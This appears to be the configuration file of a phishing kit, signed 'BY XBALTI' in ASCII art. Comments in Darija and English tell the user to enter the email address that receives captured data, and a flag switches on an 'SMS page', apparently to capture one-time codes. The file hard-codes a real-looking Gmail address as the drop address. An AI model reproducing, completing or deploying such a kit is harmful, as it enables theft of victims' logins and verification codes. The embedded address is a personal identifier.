<?php


/*   
             ,;;;;;;;,
            ;;;;;;;;;;;,
           ;;;;;'_____;'
           ;;;(/))))|((\
           _;;((((((|))))
          / |_\\\\\\\\\\\\
     .--~(  \ ~))))))))))))
    /     \  `\-(((((((((((\\
    |    | `\   ) |\       /|)
     |    |  `. _/  \_____/ |
      |    , `\~            /
       |    \  \ BY XBALTI /
      | `.   `\|          /
      |   ~-   `\        /
       \____~._/~ -_,   (\
        |-----|\   \    ';;
       |      | :;;;'     \
      |  /    |            |
      |       |            |                     
*/
// der email dyalk hna :)

// but your fucking email here 

$XBALTI_EMAIL = "samelidrissi28@gmail.com"; 

// o hna la bghiti page sms khaliha yes ila mabghitish page sms der non :)

// if you don't want page sms write non 


$sms = $_SESSION['ifsms'] = "yes"; 

?>
